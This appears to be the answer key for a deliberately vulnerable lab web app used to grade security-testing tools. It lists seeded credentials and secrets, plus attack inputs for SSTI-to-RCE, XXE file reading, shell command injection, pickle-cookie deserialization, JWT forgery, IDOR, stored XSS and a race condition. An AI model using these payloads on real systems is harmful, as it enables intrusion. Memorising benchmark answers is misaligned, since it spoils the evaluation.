# Harrowgate Residential Portal — Ground-Truth Answer Key

> ⚠️ **NOT FOR THE TARGET.** This file is the grading baseline and the
> randomization reference for this lab app. **Remove it from the deployed
> copy** before pointing any tool-under-test at the target, or you leak the
> answers. See the repo root README (“Ground-truth answer keys”).

Stack: Python / FastAPI + server-rendered Jinja2. Interface: Web UI. Port: 8000.

All line numbers are against the source as committed. Confidence is
`confirmed` unless noted.

---

## Seeded credentials & magic values

- Managers: `manager@harrowgateresidential.com` / `Fieldstone!42`; `obellweather@harrowgateresidential.com` / `Oscar-Mgmt-9` (`app/seed.py:59-60`)
- Tenant: `mthorne@example.com` / `maya-thorne-01` (+ 10 more `*@example.com`, `seed.py:62-78`)
- Bulk-import default password for imported tenants: `ChangeMe123!` (`app/routers/admin_routes.py:140`)
- **JWT secret (known):** `harrowgate-dev-secret` (`app/auth.py:8` default **and** `docker-compose.yml:7` sets the same literal)
- Export signing key on disk: `secrets/export_signing.key` = `hg-export-signing-key-131f1755d34b4287476ea8d3` (regenerated per boot via `app/main.py:19-22`)
- Concession codes (`seed.py:140-145`): `GOODWILL-RENT-50` (£500, `max_redemptions=1` — the race target), `WELCOME-CREDIT` (£20, 400), `WINTER-UTIL-10` (£10, 200), `SUMMER-23-CLOSED` (inactive — dead-end)

---

## Chain 1 — become a manager, then reach RCE primitives

All `/admin/*` and `/maintenance/{id}/status` gate only on `session.role == "manager"`
(`admin_routes.py:20-24`). **Two** independent ways to get a manager session (Step 1),
each unlocking the same Step-2 primitives. Step-2 endpoints are order-enforced behind
a manager session.

### Step 1 — get manager
| Slug | Class | Entry | Location | Sev |
|---|---|---|---|---|
| `harrowgate-mass-assignment-role` | mass assignment / privesc | `POST /api/account/update` `{"role":"manager"}` (any tenant); then re-login to mint a manager JWT | `routes/account_routes.py:41-67` (allow-list incl. `role` at 53; dynamic UPDATE 54-64) | crit |
| `harrowgate-jwt-known-secret` | auth bypass / token forgery (**standalone too**) | forge cookie `hg_session=<HS256 JWT signed with harrowgate-dev-secret, role:"manager">` — **no account needed** | `auth.py:8,24-32,40` | crit |

> Algorithm is pinned to HS256, so there is no `alg:none`/RS→HS confusion vector — the bug is purely the known secret.

### Step 2 — manager-only RCE / file-read primitives
| Slug | Class | Entry | Location | Sev |
|---|---|---|---|---|
| `harrowgate-ssti-notice` | SSTI → RCE | `POST /admin/notices/preview` `template_text={{ cycler.__init__.__globals__.os.popen('id').read() }}&tenant_id=1` | `routes/admin_routes.py:71-105` (`jinja2.Template(template_text)` 89, render 90) | crit |
| `harrowgate-xxe-import` | XXE → file read + internal SSRF | `POST /admin/import` (multipart) XML w/ external entity reading `secrets/export_signing.key` | `admin_routes.py:116-154` (`XMLParser(resolve_entities=True, no_network=False, huge_tree=True)` 130) | high |
| `harrowgate-cmd-injection-receipt` | OS command injection | `POST /admin/payments/record` `memo=";id;#` (shell=True) | `admin_routes.py:157-181` (`subprocess.run(f'... {memo} ...', shell=True)` 175) | crit |

- XXE pairs with `harrowgate-secrets-path-disclosure` (`/status` leaks the key’s absolute path). `huge_tree=True` also enables billion-laughs DoS. Compose net is `internal: true`, so SSRF is internal-only.

## Chain 2 — insecure deserialization (minimal privilege, ~one step)

| Slug | Class | Entry | Location | Sev |
|---|---|---|---|---|
| `harrowgate-pickle-cookie-rce` | insecure deserialization (pickle) → RCE | cookie `mx_filters=<base64(pickle __reduce__ payload)>` then `GET /maintenance` | `routes/maintenance_routes.py:19-31` (`pickle.loads(base64.b64decode(raw))` 29), called 44 | crit |

- Needs only *any* authenticated session (a forged JWT or any seeded login). Not gated beyond “be logged in.”

---

## Standalone findings

| Slug | Class | Entry | Location | Sev |
|---|---|---|---|---|
| `harrowgate-idor-document-download` | IDOR | `GET /documents/{id}/download` (no tenant scope; ids 1-3 = leases) | `routes/documents_routes.py:30-50` | high |
| `harrowgate-bac-status-acting-role` | broken access control (trust-the-client role) + IDOR | `POST /maintenance/{id}/status` `status=closed&acting_role=manager` — **no auth check at all in handler** | `maintenance_routes.py:146-159` (147,152,156) | high |
| `harrowgate-idor-maintenance-view` | IDOR (read) | `GET /maintenance/{id}` (no ownership check) | `maintenance_routes.py:108-127` (115) | med |
| `harrowgate-idor-maintenance-note` | IDOR (write) | `POST /maintenance/{id}/notes` `body=...` | `maintenance_routes.py:130-143` | med |
| `harrowgate-stored-xss-notes` | stored XSS | note `body=<script>…</script>`, rendered to managers | `templates/maintenance_detail.html:15` (`{{ n.body|safe }}`) | med |
| `harrowgate-concession-race` | race / TOCTOU (business logic) | concurrent `POST /api/account/redeem-concession` `code=GOODWILL-RENT-50` | `routes/account_routes.py:85-123` (check 103 vs non-atomic credit 108-113) | med |
| `harrowgate-secrets-path-disclosure` | secrets/infra exposure (unauth) | `GET /status` → absolute paths incl. export signing key file | `account_routes.py:21-34` | low→med |
| `harrowgate-concession-redos` | ReDoS — **POSSIBLE** | `code=` long run + non-matching tail | `account_routes.py:16` (`^([A-Z0-9]+-?)+$`), used 92 | low |

---

## Dead-ends — flag explicitly

- **Document path traversal** (`documents_routes.py:46`): sink *looks* traversable but `file_path` is DB-sourced only and not user-insertable → not exploitable.
- **`SUMMER-23-CLOSED` concession** (`seed.py:144`): inactive + fully redeemed → rejected at `account_routes.py:97`. Decoy.
- **`/static/internal`** (disallowed in `robots.txt`, `public_routes.py:54`): directory does not exist → 404. Content-discovery honeypot.
- **`/api/announcements|offices|amenities|faq|health`, `/health`, `/sitemap.xml`**: benign filler (recon volume only).

## Recon surface

- Unauth: `/status` (path/secret disclosure — key finding), `/health`, the `/api/*` filler, `/robots.txt`, `/sitemap.xml`.
- `robots.txt` leaks `/admin`, `/api/account` (→ mass-assignment), `/static/internal` (honeypot).
- Template/code comments as hints: `maintenance_detail.html:14` (`|safe`), `admin_routes.py:126-129` (permissive XML), `:148-151` (client acting_role), `:173-174` (shell receipt helper), `documents_routes.py:36-38` (id-only lookup), `maintenance_routes.py:21-24` (pickled cookie), `account_routes.py:19-20` (status scope-creep), `db.py:13-16` (WAL hint for the race).
- `secrets/` ships a committed `export_signing.key`. `uploads/leases/` = `lease_t1/t2/t3.txt` (IDOR-downloadable). Compose net `internal: true` → SSRF internal-only.
